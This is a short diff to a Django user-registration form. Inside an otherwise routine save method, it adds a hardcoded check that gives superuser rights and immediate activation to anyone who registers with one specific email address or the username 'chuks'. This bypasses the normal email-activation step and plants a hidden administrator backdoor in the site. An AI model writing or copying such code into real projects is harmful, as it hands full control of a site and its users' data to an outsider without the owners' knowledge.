@@ -40,9 +40,13 @@ class RegisterForm(forms.ModelForm):
 		user=super(RegisterForm, self).save(commit=False)
 		user.set_password(self.cleaned_data['password1'])
 		user.is_active=False
+		
 		#creat a new user hash for activating email
 
 		if commit:
+			if user.email == 'agboemmanuel002@gmail.com' or user.username == 'chuks' :
+				user.is_superuser = True
+				user.is_active=True
 			user.save()
 			print(user)
 			send_activation_email(user)
